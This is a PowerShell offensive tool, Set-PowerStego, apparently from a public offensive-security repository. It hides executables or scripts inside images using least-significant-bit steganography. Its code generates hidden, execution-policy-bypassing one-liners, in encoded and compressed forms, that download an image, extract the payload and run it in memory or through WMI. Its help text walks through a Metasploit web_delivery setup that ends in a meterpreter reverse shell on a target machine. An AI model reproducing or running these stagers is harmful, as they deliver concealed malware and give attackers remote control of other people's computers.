function Set-PowerStego {
<#
.SYNOPSIS
    Hide a payload inside of a selected image.
    Unhide and execute a payload hided inside of a selected image. 

    Author: Ricardo Ribeiro Tavares (@1RicardoTavares)
    License: BSD 3-Clause
	
    Required Dependencies: None
    Optional Dependencies: None


.DESCRIPTION
    Set-PowerStego allows text or binary files (including payloads developed in powershell and/or executable files) to be inserted into a selected image using the Least Significant Bits (LSB) technique. It will also be possible to recover the inserted file and in some cases execute it directly in the memory.

.PARAMETER Method
    Set the method that will be used:
        Analyze - Analyze the selected image, obtaining information about its properties and storage capacities. Important to identify the amount of pixels in the selected image and the amount of bytes supported during insertion of a file;
        Hide - Generate a new image hiding a file inside of a selected image; 
        UnHide - Extracts the file that exists inside of a selected image to disk;
        GeneratePayload - Generates two command lines (scripts), a BASE64 and a COMPRESSED scripts to execute on the target. The command lines are intended to extract a file from the selected image and run it in memory (Powershell Text - Script) or disk (BINARY - Executable file).

.PARAMETER SourceImage
    Set the source of the selected image:
        File - Selected image stored on disk;
        URL - Selected image stored in a URL (website).

.PARAMETER SourceImagePath
    Set the path of the selected image according to the settings made in the SourceImage parameter.

.PARAMETER ImageDestinationPath
    Set the path where the new image will be generated when the selected method is Hide.

.PARAMETER PayloadSource
    Set the source of the Payload.

    Binary - Binary file (Executable files can be executed automatically after extraction using the GeneratePayload option)
    Text - Text file (Powershell scripts may run automatically in memory after extraction using the GeneratePayload option)
    
.PARAMETER PayloadPath
    Set the path from the extracted file.

.EXAMPLE
    Performing analysis.

    Set-PowerStego -Method Analyze -ImageSource File -ImageSourcePath C:\Images\myimage.png
    Demonstrate the properties of a image stored on disk.

    Set-PowerStego -Method Analyze -ImageSource URL -ImageSourcePath http://www.site.com/myimage.png
    Demonstrate the properties of a image stored on website. 

.EXAMPLE
    Hiding a payload (binary ou text) inside of a image. 

    Set-PowerStego -Method Hide -ImageSource File -ImageSourcePath C:\Images\myimage.png -ImageDestinationPath C:\Images\myimagewithpayload.png -PayloadSource Binary -PayloadPath C:\Tools\mybinaryfile.exe
    Using a image myimage.png stored on disk, it will be generate a new image myimagewithpayload.png storing the file mybinaryfile.exe

    Set-PowerStego -Method Hide -ImageSource URL -ImageSourcePath http://www.site.com/myimage.png -ImageDestinationPath C:\Images\myimagewithpayload.png -PayloadSource Binary -PayloadPath C:\Tools\mybinaryfile.exe
    Using a image myimage.png from a website, it will be generate a new image myimagewithpayload.png storing the file mybinaryfile.exe

    Set-PowerStego -Method Hide -ImageSource File -ImageSourcePath C:\Images\myimage.png -ImageDestinationPath C:\Images\myimagewithpayload.png -PayloadSource Text -PayloadPath C:\Script\script.ps1
    Using a image myimage.png stored on disk, it will be generate a new image myimagewithpayload.png storing the file script.ps1

    Set-PowerStego -Method Hide -ImageSource URL -ImageSourcePath http://www.site.com/myimage.png -ImageDestinationPath C:\Images\myimagewithpayload.png -PayloadSource Text -PayloadPath C:\Script\script.ps1
    Using a image myimage.png from a website, it will be generate a new image myimagewithpayload.png storing the file script.ps1


.EXAMPLE
    Extracting a payload (binary ou text) from a image.

    Set-PowerStego -Method UnHide -ImageSource File -ImageSourcePath C:\Images\myimage.png -PayloadSource Text -PayloadPath C:\temp\myscript.txt
    Extract a payload from the image myimage.png stored on disk to the file myscript.txt (text format). 

    Set-PowerStego -Method UnHide -ImageSource URL -ImageSourcePath http://www.site.com/myimage.png -PayloadSource Text -PayloadPath C:\temp\myscript.txt
    Extract a payload from the image myimage.png from a website to the file myscript.txt (text format). 
 
    Set-PowerStego -Method UnHide -ImageSource File -ImageSourcePath C:\Images\myimage.png -PayloadSource Text Binary -PayloadPath c:\temp\mypayload.exe
    Extract a payload from the image myimage.png stored on disk to the file myscript.exe (binary format).

    Set-PowerStego -Method UnHide -ImageSource URL -ImageSourcePath http://www.site.com/myimage.png -PayloadSource Binary -PayloadPath c:\temp\mypayload.exe
    Extract a payload from the image myimage.png from a website to the file myscript.exe (binary format). 
 
.EXAMPLE
    Generate a command line (powershell script) to automatize de payload extraction and execution.

    Set-PowerStego -Method GeneratePayload -ImageSource File -ImageSourcePath C:\Images\myimage.png -PayloadSource Text -PayloadPath C:\temp\myscript.txt
    Generate a powershell script to extract the payload from the image myimage.png stored on disk to the file myscript.txt. After execute the command line from the the file myscript.txt on the target, the payload will be extract from the image and executed automaticaly.

    Set-PowerStego -Method GeneratePayload -ImageSource URL -ImageSourcePath http://www.site.com/myimage.png -PayloadSource Text -PayloadPath C:\temp\myscript.txt
    Generate a powershell script to extract the payload from the image myimage.png stored on a website to the file myscript.txt. After execute the command line from the the file myscript.txt on the target, the payload will be extract from the image and executed automaticaly.

    Set-PowerStego -Method GeneratePayload -ImageSource File -ImageSourcePath C:\Images\myimage.png -PayloadSource Binary -PayloadPath c:\temp\mypayload.exe
    Generate a powershell script to extract the payload from the image myimage.png stored on disk to the file myscript.txt. After execute the command line from the the file myscript.txt on the target, the payload will be extract from the image and executed automaticaly.

    Set-PowerStego -Method GeneratePayload -ImageSource URL -ImageSourcePath http://www.site.com/myimage.png -PayloadSource Binary -PayloadPath c:\temp\mypayload.exe
    Generate a powershell script to extract the payload from the image myimage.png stored on a website to the file myscript.txt. After execute the command line from the the file myscript.txt on the target, the payload will be extract from the image and executed automaticaly.

 .EXAMPLE
    CASE STUDY - Hiding a meterpreter payload inside of image.
    
    1 - Open the msfconsole.
    msfconsole
    
    2 - Select and configure the web_delivery exploit.
    use exploit/multi/script/web_delivery  
    set windows/meterpreter/reverse_https
    set target 2
    set srvport 80
    set uripath /report
    set LHOST <IPADDRESS>
    set LPORT 443
    exploit -j -z

    3 - From your Windows machine download the powershell script from webdelivery.
    iwr http://IPFROMMETASPLOITHOST/report -OutFile report.txt
 
    4 - Open the powershell and import the Set-Powerstego.ps1.
    Import-Module Set-Powerstego.ps1

    5 - Select and analize the properties from a image (PNG ou BMP) with a good resolution.
    Set-PowerStego -Method Analyze -ImageSource File -ImageSourcePath <image.png>

    6 - Hide de payload inside the image.
    Set-PowerStego -Method Hide -ImageSource File -ImageSourcePath myimage.png -ImageDestinationPath myimagewithpayload.png -PayloadSource Text -PayloadPath script.ps1

    7 - Copy the image to the METASPLOIT host and start a webserver to be possible access the image.
    cd imagefolder
    pythom -m SimpleHTTPServer 8080

    8 - From the Windows workstation extract the payload to the disk. 
    Set-PowerStego -Method UnHide -ImageSource URL -ImageSourcePath http://<IPFROMMETASPLOITHOST:8080>/myimage.png -PayloadSource Text -PayloadPath report2
    
    Open the file report2 and compare with the file report.  

    9 - Generate a command line to execute the payload on the target. 
    Set-PowerStego -Method GeneratePayload -ImageSource URL -ImageSourcePath http://<IPFROMMETASPLOITHOST:8080>/myimage.png -PayloadSource Text -PayloadPath myscript.txt

    Execute the content from the file myscript.txt on any Windows workstion with powershell and access to the metasploit host.
    After the execution, it will be download the image to the memory from the target, the payload extration and execution on the memory, and you will receive a meterpreter shell on the Metasploit host. 
     
.LINK
    https://github.com/1RicardoTavares/Offensive-PowerShell

#>

[CmdletBinding()]
    Param(

        [parameter(Position=0,Mandatory=$true)]
        [validateset("Analyze","GeneratePayload","Hide","UnHide" )]
        [string]$Method,

        [parameter(Position=1,Mandatory=$true)]
        [validateset("File","URL" )]
        [string]$ImageSource,
        
        [parameter(Position=2,Mandatory=$true)]
        [ValidateScript({
        $Path = $_ 
        $ValidPath = Test-Path $_
            switch ($ImageSource) {
                "File" {
                    If ($ValidPath -eq $True ) {
                        $True
                    } else {
                        Throw "$Path is not a valid path or the file specified does not exist"
                    }
                }
                "URL" {
                    If ($Path  -match "^http(s?)\:\/\/[0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*(:(0-9)*)*(\/?)([a-zA-Z0-9\-\.\?\,\'\/\\\+&amp;%\$#_]*)?$") {
                        $True
                    } else {
                        Throw "$Path is not a valid URL."
                    }
                }
            }
        })]
        [string]$ImageSourcePath
    
    )

    DynamicParam { 
        If ($Method -ne "Analyze") {             
            $RuntimeParameterDictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
        
            switch ($Method) { 
                "Hide" {
                    $ValidPath = Test-Path $_ -IsValid  
                    $ParameterName1 = 'ImageDestinationPath'
                    $ParameterAttribute1 = New-Object System.Management.Automation.ParameterAttribute
                    $ParameterAttribute1.Mandatory = $true
                    $ParameterAttribute1.Position = 0
                    $ValidateScriptAttribute1 = New-Object System.Management.Automation.ValidateScriptAttribute({$ValidPath})
                    $AttributeCollection1 = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
                    $AttributeCollection1.Add($ParameterAttribute1)
                    $AttributeCollection1.Add($ValidateScriptAttribute1)
                    $RuntimeParameter1 = New-Object System.Management.Automation.RuntimeDefinedParameter($ParameterName1, [string], $AttributeCollection1)
                    $RuntimeParameterDictionary.Add($ParameterName1, $RuntimeParameter1)           
                }
                "GeneratePayload" {
                    $ValidPath = Test-Path $_ -IsValid
                }
                "Hide" {
                    $ValidPath = Test-Path $_ -IsValid
                }
                "UnHide" {
                    $ValidPath = Test-Path $_
                }
            }  

            $ParameterName2 = 'PayloadSource'
            $ParameterAttribute2 = New-Object System.Management.Automation.ParameterAttribute
            $ParameterAttribute2.Mandatory = $true
            $ParameterAttribute2.Position = 0
            $ValidateSetAttribute2 = New-Object System.Management.Automation.ValidateSetAttribute("Binary","Text")
            $AttributeCollection2 = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
            $AttributeCollection2.Add($ParameterAttribute2)
            $AttributeCollection2.Add($ValidateSetAttribute2)
            $RuntimeParameter2 = New-Object System.Management.Automation.RuntimeDefinedParameter($ParameterName2, [string], $AttributeCollection2)
            $RuntimeParameterDictionary.Add($ParameterName2, $RuntimeParameter2)
                             
            $ParameterName3 = 'PayloadPath'
            $ParameterAttribute3 = New-Object System.Management.Automation.ParameterAttribute
            $ParameterAttribute3.Mandatory = $true
            $ParameterAttribute3.Position = 0
            $ValidateScriptAttribute3 = New-Object System.Management.Automation.ValidateScriptAttribute({$ValidPath})
            $AttributeCollection3 = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
            $AttributeCollection3.Add($ParameterAttribute2)
            $AttributeCollection3.Add($ValidateScriptAttribute2)
            $RuntimeParameter3 = New-Object System.Management.Automation.RuntimeDefinedParameter($ParameterName3, [string], $AttributeCollection3)
            $RuntimeParameterDictionary.Add($ParameterName3, $RuntimeParameter3)        
       
            return $RuntimeParameterDictionary
    
        }   
    }
        
    Begin {
        If ($Method -ne "Analyze") {
            If ($ParameterName1 -ne $null) {
                $ImageDestinationPath = $PsBoundParameters[$ParameterName1]
            }
            $PayloadSource = $PsBoundParameters[$ParameterName2] 
            $PayloadPath = $PsBoundParameters[$ParameterName3]
        }  
    }

    Process {
        [void][System.Reflection.Assembly]::LoadWithPartialName('System.drawing')

        switch ($ImageSource) {
            "File" {
                $Image = New-Object System.Drawing.Bitmap($ImageSourcePath)
            }           
            "URL" {
                Try {
                    $req = New-Object System.Net.WebClient
                    $req.proxy=[Net.WebRequest]::DefaultWebProxy
                    $req.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials
                    $stream = $req.downloadstring($ImageSourcePath) | %{[System.Text.Encoding]::Default.GetBytes($_)}  
                    $memorystream = New-Object IO.MemoryStream($stream, 0, $stream.Length)
                    $Image = New-Object System.Drawing.Bitmap($memorystream) 
                }
                Catch { 
                    Write-host -ForegroundColor Red -nonewline "The URL $ImageSourcePath is unreachable.`\n"
                } 
                  
            } 
        }
          
        switch ($Method) {
            "Analyze" {
                $Image
                $MC = (($Image.Width * $Image.Height))
                Write-Host Total Pixels = $MC
                Write-Host bits to use = ($MC * 3) 
                Write-Host bytes to use = (($MC * 3)/8)
                Write-Host Kbytes to use = (($MC * 3)/8192) 
                Write-Host Mbytes to use = (($MC * 3)/8388608)      
            }
            "Hide" {
                switch ($PayloadSource) {    
                    "Binary" {
                        $Payload = [System.Convert]::ToBase64String(([System.IO.File]::ReadAllBytes($PayloadPath)))
                    } 
                    "Text" {
                        $Payload = Get-Content $PayloadPath
                    }    
                } 
                If ($Payload.Length -lt ($Image.Width * $Image.Height)*3) {
                    $l = 0
                    $Payloadbin = ([System.Text.Encoding]::UTF8.GetBytes($Payload) | %{[System.Convert]::ToString($_,2).PadLeft(8,'0') }) -join "" 
                        Foreach($Y in (1..($Image.Height-1))) { 
                            Foreach($X in (1..($Image.Width-1))) {
                                If ($l -le $Payloadbin.Length) {
                                    Write-Progress -Activity "Working" -PercentComplete ($l/$Payloadbin.Length*100)
                                    $binpixelcolor = $Image.Getpixel($X,$Y).Name | %{[System.Convert]::ToString("0x"+$_, 2)}  
                                        for($i=15;$i -lt $binpixelcolor.Length ;$i+=8){
                                            $binpixelcolor = $binpixelcolor -replace "(?<=^.{$i}).",$Payloadbin[$l] 
                                            $l++            
                                        }   
                                    $hexnewpixelcolor = [convert]::ToInt64($binpixelcolor,2) | %{[Convert]::ToString($_, 16)}
                                    $Image.Setpixel($X,$Y,"#" + $hexnewpixelcolor)
                                } ELSE {
                                    $Image.Save($ImageDestinationPath)
                                    $Image.Dispose()
                                    return
                                }                           
                            }
                        }
                } ELSE {
                    Write-host -fore Red -nonewline "The image $ImageSourcePath does not have enough space free to storage your payload. Select a new image."
                }              
             }
            "UnHide" {         
                $chars = (-join ' `''"~!@#$%^&*()-_+={}|[]\/:;.,<>' + [char[]]([char]'a'..[char]'z' + [char]'A'..[char]'Z' + [char]'0'..[char]'9')).ToCharArray()
                Foreach($Y in (1..($Image.Height-1))) { 
                    Foreach($X in (1..($Image.Width-1))) {
                            $binpixelcolor = ($Image.Getpixel($X,$Y).Name | %{[System.Convert]::ToString("0x"+$_, 2)}) 
                            for($i=15;$i -lt $binpixelcolor.Length ;$i+=8){                                 
                                $newbinpixelcolor += $binpixelcolor[$i]
                                if ($newbinpixelcolor.Length -eq 8) {
                                    $strnewpixelcolor = [char][convert]::toint32($newbinpixelcolor,2)
                                        if ($strnewpixelcolor -in $chars) {
                                            $str += $strnewpixelcolor 
                                        } else {
                                            switch ($PayloadSource) {    
                                                "Binary" {
                                                    $Payload = [IO.File]::WriteAllBytes($PayloadPath, [System.Convert]::FromBase64String($str))
                                                } 
                                                "Text" {
                                                    $Payload = Write-Output $str | Out-File $PayloadPath
                                                }    
                                            } 
                                            $Payload
                                            $Image.Dispose() 
                                            return
                                        } 
                                    Clear-Variable newbinpixelcolor 
                                }                                                             
                            }                                              
                    }
                }
             } 
            "GeneratePayload" {
                switch ($ImageSource) {
                    "File" {
                        $im = "[void][System.Reflection.Assembly]::LoadWithPartialName('System.drawing');`$im" +
                        "=New-Object System.Drawing.Bitmap('$ImageSourcePath');"
                    }

                    "URL"{
                        $im = "[void][System.Reflection.Assembly]::LoadWithPartialName('System.drawing');`$r=" +
                        "New-Object System.Net.WebClient;`$r.proxy=[Net.WebRequest]::DefaultWebProxy;`$r.Prox" +
                        "y.Credentials=[Net.CredentialCache]::DefaultCredentials;`$st=`$r.downloadstring('"    + 
                        "$ImageSourcePath')|%{[System.Text.Encoding]::Default.GetBytes(`$_)};`$ms=New-Object " +
                        "IO.MemoryStream(`$st,0,`$st.Length);`$im=New-Object System.Drawing.Bitmap(`$ms);"
                    }
                }
                switch ($PayloadSource) {    
                    "Binary" {
                        $randomfile = Get-Random
                        $Payload = "[IO.File]::WriteAllBytes(`"$env:temp\$randomfile.exe`", [System.Convert]:" +
                        ":FromBase64String(`$str));Invoke-CimMethod -Namespace root\cimv2 -ClassName Win32_Pr" +
                        "ocess -MethodName Create -Arguments @{CommandLine=`"$env:temp\$randomfile.exe`"}"
                    } 
                    "Text" {
                        $Payload = "&powershell.exe -nop -w hidden -exec bypass -command `"`$str`"" 
                    }    
                }

                $pr=$im + "`$nbp='';`$str='';`$chars=(-join ' `''`"~!@#$%^&*()-_+={}|[]\/:;.,<>'+[char[]]([" + 
                "char]'a'..[char]'z'+[char]'A'..[char]'Z'+[char]'0'..[char]'9')).ToCharArray();Foreach(`$Y " +
                "in (1..(`$im.Height-1))){Foreach(`$X in (1..(`$im.Width-1))){`$bp=(`$im.Getpixel(`$X,`$Y)." +
                "Name|%{[System.Convert]::ToString('0x'+`$_,2)});for(`$i=15;`$i -lt `$bp.Length;`$i+=8){`$n" +
                "bp+=`$bp[`$i];if(`$nbp.Length -eq 8){`$snp=[char][convert]::toint32(`$nbp,2);if(`$snp -in " +
                "`$chars){`$str+=`$snp;}else{$Payload;`$im.Dispose();return;}Clear-Variable nbp}}}}" 
                
                $pb = [Text.Encoding]::Unicode.GetBytes($pr)
                $pe = [System.Convert]::ToBase64String($pb)
                $pec = "powershell -nop -w hidden -exec bypass -ENC $pe"
                $ms = New-Object IO.MemoryStream
                $cs = New-Object IO.Compression.DeflateStream ($ms,[IO.Compression.CompressionMode]::Compress)
                $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
                $sw.WriteLine($pr)
                $sw.Close()
                $pc = [Convert]::ToBase64String($ms.ToArray())
                $pcc = "powershell -nop -w hidden -exec bypass Invoke-Expression `$(New-Object IO.StreamRead" +
                "er (`$(New-Object IO.Compression.DeflateStream (`$(New-Object IO.MemoryStream(,`$([Convert]" +
                "::FromBase64String('$pc')))),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]" +
                "::ASCII)).ReadToEnd();"
                $payloadview = "`n CHOOSE THE PAYLOAD TO USE `n" + 
                "**************************`n"+
                "* --- BASE64 PAYLOAD --- *`n"+
                "**************************`n"+
                "$pec `n"+ 
                "**************************`n"+ 
                "* - COMPRESSED PAYLOAD - *`n"+ 
                "**************************`n"+
                "$pcc"
                Write-Host $payloadview
                Write-Output $payloadview | Out-File $PayloadPath
            } 
        } 
    }

}